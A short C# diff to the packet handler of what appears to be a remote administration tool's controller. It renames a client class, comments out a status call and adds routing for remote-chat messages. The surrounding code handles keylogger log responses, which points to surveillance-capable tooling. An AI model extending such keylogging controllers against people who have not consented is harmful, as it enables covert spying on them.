@@ -6,13 +6,13 @@ namespace Serveur.Packets
 {
     public static class PacketHandler
     {
-        public static void packetChecker(ClientMosaic client, IPackets packet)
+        public static void packetChecker(ClientMosaique client, IPackets packet)
         {
             var type = packet.Type;
 
             if (type == TypePackets.SetStatus)
             {
-                Views.FrmMain.instance.setWarning((SetStatus)packet);
+                //Views.FrmMain.instance.setWarning((SetStatus)packet);
             }
             else if (type == TypePackets.GetMonitorsResponse)
             {
@@ -70,6 +70,10 @@ namespace Serveur.Packets
             else if (type == TypePackets.GetKeyLoggerLogsResponse)
             {
                 FrmKeyLoggerController.getKeyLoggerLogsResponse(client, (GetKeyLoggerLogsResponse)packet);
+            }
+            else if (type == TypePackets.MsgToRemoteChat)
+            {
+                FrmRemoteChatController.msgFromRemoteChat(client, (MosaiqueServeur.Packets.ServerPackets.MsgToRemoteChat)packet);
             }
         }
     }
